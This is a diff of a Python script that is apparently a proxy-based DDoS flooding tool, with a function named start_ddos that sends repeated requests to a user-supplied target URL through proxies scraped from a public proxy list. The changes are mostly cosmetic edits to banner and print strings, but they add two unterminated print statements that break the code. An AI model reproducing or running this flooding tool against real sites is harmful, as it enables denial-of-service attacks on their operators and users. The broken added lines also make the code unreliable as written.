@@ -78,8 +78,8 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+ "disturb-proxy: {}".format(prox))
-			print("\033[104m\033[37m\033[3mServer gate :>\033[0m \033[38;5;220m\033[3m" +str(url)+ "\033[0m")
+			print(color+ "disturb-proxy:  {}".format(prox))
+			print("\033[104m\033[37m\033[3mServer gate :>\033[0m  \033[38;5;220m\033[3m" +str(url)+ "\033[0m")
 			
 	except:
 		pass
@@ -89,7 +89,7 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
 	if url == None:
-		print("\033[38;5;220m┌[KunFayz————]😁\033[0m")
+		print("\033[38;5;220m┌[KunFayz————]😁🤣\033[0m")
 		url = input("\033[38;5;220m└>••URL: \033[97m")
 	if url[:4] != "http":
 		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
@@ -99,14 +99,16 @@ def main(proxy, url):
 			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
 			array = req.text.split()
 			print(Back.YELLOW+Fore.WHITE+"••>Found {} new proxies".format(len(array))+Style.RESET_ALL)
-			print("\033[104m\033[37m" +str(url)+ "\033[0m")
+			print("\033[104m\033[37m " +str(url)+ "\033[0m")
 			check_prox(array, url)
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
 			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
+			print("
 			print("\033[104m\033[37m" +str(url)+ "\033[0m \033[34mProssecing 0n")
+			print("
 			check_prox(array, url)
 		except FileNotFoundError:
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
